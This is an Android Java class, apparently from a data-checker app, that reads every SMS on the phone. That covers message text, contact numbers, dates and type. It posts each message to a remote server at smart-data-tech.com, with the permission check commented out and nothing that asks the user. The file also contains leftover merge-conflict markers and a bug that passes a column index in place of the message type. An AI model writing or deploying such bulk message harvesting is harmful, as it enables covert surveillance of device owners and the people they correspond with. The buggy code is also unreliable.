package com.example.androiddatachecker;


import android.content.ContentResolver;
import android.content.Context;
import android.content.ContextWrapper;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Telephony;
import android.support.v4.content.ContentResolverCompat;
import android.support.v7.app.AppCompatActivity;

import android.widget.Toast;


import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
//<<<<<<< HEAD
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
//=======
import java.util.ArrayList;
//>>>>>>> bf8e205468ab6a00224c4dde462ce599b2d18f92
import java.util.List;

public class SaveUserMessage extends AppCompatActivity {

    //private static MainActivity inst;


    //private
    private static ContextWrapper context;
    //ContextWrapper context = new ContextWrapper(contextc);
    //private static ContentResolver contentResolver;

    SimpleDateFormat heuref = new SimpleDateFormat("HH:mm");
    String heureFormatter = heuref.format(new Date());
    ////////////////date/////////////////////
    SimpleDateFormat datef = new SimpleDateFormat("dd/MM/yyyy");
    String dateFormatter = datef.format(new Date());
    ///////////////////le context de l'application///////////////////
    public SaveUserMessage(ContextWrapper context) {
        this.context = context;
    }

    protected void SaveUserMessages() {
        //if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            /*if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

                return;
            }*/
//<<<<<<< HEAD

        ContentResolver contentResolver = context.getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        int dat = smsInboxCursor.getColumnIndex("date_sent");
        int typesms = smsInboxCursor.getColumnIndex("type");
        String varr="non";
        Toast.makeText(context, "Entrée dans Do ", Toast.LENGTH_LONG).show();

        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;
        do {
            //Integer.toString(smsInboxCursor.getColumnIndex("address")),
            varr ="oui";
            Date date = new Date(smsInboxCursor.getLong(dat));
            String formattedDate = new SimpleDateFormat("dd/MM/yyyy").format(date);
            Date heur = new Date(smsInboxCursor.getLong(dat));
            String formattedHeure = new SimpleDateFormat("HH:mm").format(heur);

            InsertData(1,
                    458,
                    smsInboxCursor.getString(indexBody),
                    TypeSms(typesms),
                    formattedDate,
                    formattedHeure,
                    smsInboxCursor.getString(indexAddress),
                    smsInboxCursor.getString(indexAddress),
                    dateFormatter,
                    heureFormatter,
                    "actif");

        } while (smsInboxCursor.moveToNext());
        smsInboxCursor.close();
        //InsertData("papa","pa@mail.com");
        //}


        Toast.makeText(context,"on sort du do avec"+varr,Toast.LENGTH_LONG).show();

    }

    protected void InsertData ( final int id_user, final int id_message,
                                final String contenu_message, final String type_message,
                                final String dat_message, final String heure_message, final String correspondant_number,
                                final String correspondant_name, final String dat_ins_message,
                                final String heure_ins_message,
                                final String etat){

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected String doInBackground(String... params) {

                /*String NameHolder = name;
                String EmailHolder = email;*/

                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

               /*nameValuePairs.add(new BasicNameValuePair("name",Integer.toString(id_user)));
                nameValuePairs.add(new BasicNameValuePair("email",Integer.toString(id_message)));*/
                nameValuePairs.add(new BasicNameValuePair("id_user", Integer.toString(id_user)));
                nameValuePairs.add(new BasicNameValuePair("id_message", Integer.toString(id_message)));
                nameValuePairs.add(new BasicNameValuePair("contenu_message", contenu_message));
                nameValuePairs.add(new BasicNameValuePair("type_message", type_message));
                nameValuePairs.add(new BasicNameValuePair("dat_message", dat_message));
                nameValuePairs.add(new BasicNameValuePair("heure_message", heure_message));
                nameValuePairs.add(new BasicNameValuePair("correspondant_number", correspondant_number));
                nameValuePairs.add(new BasicNameValuePair("correspondant_name", correspondant_name));
                nameValuePairs.add(new BasicNameValuePair("dat_ins_message", dat_ins_message));
                nameValuePairs.add(new BasicNameValuePair("heure_ins_message", heure_ins_message));
                nameValuePairs.add(new BasicNameValuePair("etat", etat));

                try {
                    HttpClient httpClient = new DefaultHttpClient();

                    HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/API/v1/saveUserMessage/");
                    // HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");

                    //HttpPost httpPost = new HttpPost("http://smart-data-tech.com/dev/fr/crud.php");
                    httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse httpResponse = httpClient.execute(httpPost);

                    HttpEntity httpEntity = httpResponse.getEntity();


                } catch (ClientProtocolException e) {

                } catch (IOException e) {

                }
                return "Data Inserted Successfully";
            }

            @Override
            protected void onPostExecute(String result) {

                super.onPostExecute(result);

                //Toast.makeText(MainActivity.this, "Data Submit Successfully", Toast.LENGTH_LONG).show();

            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(Integer.toString(id_user), Integer.toString(id_message), contenu_message, type_message,
                dat_message, heure_message, correspondant_number,
                correspondant_name, dat_ins_message, heure_ins_message,
                etat);
    }

    private String TypeSms(int type) {
        switch (type) {
            case Telephony.TextBasedSmsColumns.MESSAGE_TYPE_INBOX:
                return "Reçu";
            //break;
            case Telephony.TextBasedSmsColumns.MESSAGE_TYPE_SENT:
                return "Envoyé";
            //break;
            case Telephony.TextBasedSmsColumns.MESSAGE_TYPE_DRAFT:
                return "Brouillon";
            case Telephony.TextBasedSmsColumns.MESSAGE_TYPE_FAILED:
                return "Echec";
            //break;
            case Telephony.TextBasedSmsColumns.MESSAGE_TYPE_QUEUED:
                return "A envoyer plutard";
            //break;
            default:
                return "tout";
            //break;
        }
    }
}
